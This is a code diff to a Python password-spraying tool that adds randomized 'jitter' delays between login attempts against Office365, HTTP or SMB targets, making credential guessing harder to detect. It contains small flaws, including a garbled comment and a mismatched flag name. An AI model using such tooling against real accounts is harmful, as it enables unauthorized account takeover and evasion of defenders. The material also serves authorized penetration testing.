@@ -12,6 +12,7 @@ import logging
 import analyze
 import requests
 import warnings
+import random
 from time import sleep
 
 
@@ -19,7 +20,7 @@ from time import sleep
 colors = analyze.Color()
 
 def args():
-    parser = argparse.ArgumentParser(description="low and slow password spraying tool", formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser = argparse.ArgumentParser(description="Low and slow password spraying tool", formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument("-p", "--passwords", type=str, dest="passlist", help="filepath of the passwords list or a single password to spray", required=True)
     parser.add_argument("-H", "--host", type=str, dest="host", help="host to password spray (ip or hostname). Can by anything when using Office365 module - only used for logfile name.", required=False)
     parser.add_argument("-m", "--module", type=str, dest="module", help="module corresponding to target host", required=True)
@@ -33,6 +34,8 @@ def args():
     parser.add_argument("-f", "--fireprox", type=str, dest="fireprox", help="the url of the fireprox interface, if you are using fireprox.", required=False)
     parser.add_argument("-d", "--domain", type=str, dest="domain", help="HTTP: Prepend DOMAIN\\ to usernames. SMB: Supply domain for smb connection", required=False)
     parser.add_argument("--analyze", action="store_true", dest="analyze_results", help="Run the results analyzer after each spray interval. False positives are more likely", required=False)
+    parser.add_argument("--jitter", type=int, dest="jitter", help="Jitter time between requests in seconds.", required=False)
+    parser.add_argument("--jitter_min", type=int, dest="jitter_min", help="Minimum time between requests in seconds.", required=False)
 
 
     args = parser.parse_args()
@@ -75,7 +78,18 @@ def args():
         print()
         input('Press enter to continue anyways:')
 
-    return users, passwords, args.host, args.csvfile, args.attempts, args.interval, args.equal, args.module, args.timeout, args.port, args.fireprox, args.domain, args.userlist, args.passlist, args.analyze_results
+    # Check that jitter flags aren't supplied without independently
+    if args.jitter_min and not args.jitter:
+        colors.color_print("--jitter_min flag must be set with --jitter flag", colors.red)
+        exit()
+    elif args.jitter and not args.jitter_min:
+        colors.color_print("--jitter flag must be set with --jitter_min flag", colors.red)
+        exit()
+    if args.jitter and args.jitter_min and args.jitter_min >= args.jitter:
+        colors.color_print("--jitter flag must be greater than --jitter-min flag", colors.red)
+        exit()
+
+    return users, passwords, args.host, args.csvfile, args.attempts, args.interval, args.equal, args.module, args.timeout, args.port, args.fireprox, args.domain, args.userlist, args.passlist, args.analyze_results, args.jitter, args.jitter_min
 
 
 def check_sleep(login_attempts, attempts, interval, csvfile, analyze_results):
@@ -91,6 +105,7 @@ def check_sleep(login_attempts, attempts, interval, csvfile, analyze_results):
         return 0
     else:
         return login_attempts
+
 
 
 def check_file_contents(file_path, current_list):
@@ -144,7 +159,7 @@ def ascii():
 
 def main():
     requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-    users, passwords, host, csvfile, attempts, interval, equal, module, timeout, port, fireprox, domain, userfile, passfile, analyze_results = args()
+    users, passwords, host, csvfile, attempts, interval, equal, module, timeout, port, fireprox, domain, userfile, passfile, analyze_results, jitter, jitter_min = args()
     # try to instantiate the specified module
     try:
         module = module.title()
@@ -208,6 +223,10 @@ def main():
     if equal:
         for username in users:
             pword = username.split('@')[0]
+            if jitter is not None:
+                if jitter_min is None:
+                    jitter_min = 0
+                time.sleep(random.randint(jitter_min,jitter))
             login(target, username, pword, csvfile)
             
             # log the login attempt
@@ -240,6 +259,10 @@ def main():
         for username in users:
             if domain:
                 username = f'{domain}\\{username}'
+            if jitter is not None:
+                if jitter_min is None:
+                    jitter_min = 0
+                time.sleep(random.randint(jitter_min,jitter))
             login(target, username, password, csvfile)
             
             # log the login attempt
